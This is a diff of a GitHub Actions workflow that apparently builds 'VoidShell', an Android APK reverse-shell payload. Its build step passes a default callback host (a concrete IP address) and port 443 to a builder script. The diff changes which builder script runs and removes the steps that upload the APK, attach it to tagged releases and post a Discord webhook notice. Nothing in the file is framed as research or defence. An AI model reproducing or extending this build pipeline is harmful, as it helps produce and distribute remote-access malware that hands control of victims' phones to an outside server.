@@ -43,34 +43,9 @@ jobs:
           KEYSTORE_PASS: ${{ secrets.KEYSTORE_PASS }}
         run: |
           # If you don't use secrets, hardcode or use defaults
-          python builder_v2.py \
+          python builder.py \
             --lhost "${LHOST:-194.169.34.12}" \
             --lport "${LPORT:-443}" \
             --output "dist/${{ steps.vars.outputs.apk_name }}"
 
-      - name: Upload APK as artifact (always available)
-        uses: actions/upload-artifact@v4
-        with:
-          name: VoidShell-APK
-          path: dist/*.apk
-          retention-days: 30
-
-      - name: Create GitHub Release + attach APK (only on tags)
-        if: startsWith(github.ref, 'refs/tags/')
-        uses: softprops/action-gh-release@v2
-        with:
-          files: dist/*.apk
-          name: VoidShell ${{ github.ref_name }}
-          draft: false
-          prerelease: false
-          body: |
-            Automated build – ${{ steps.vars.outputs.build_id }}
-            Built at: ${{ github.event.head_commit.timestamp || steps.vars.outputs.build_id }}
-            Commit: ${{ github.sha }}
-
-      - name: Notify (optional – Discord/Telegram)
-        if: always()
-        run: |
-          curl -X POST -H 'Content-type: application/json' \
-            --data "{\"content\":\"VoidShell build finished\nAPK: ${{ steps.vars.outputs.apk_name }}\nStatus: ${{ job.status }}\"}" \
-            ${{ secrets.DISCORD_WEBHOOK }}
+      
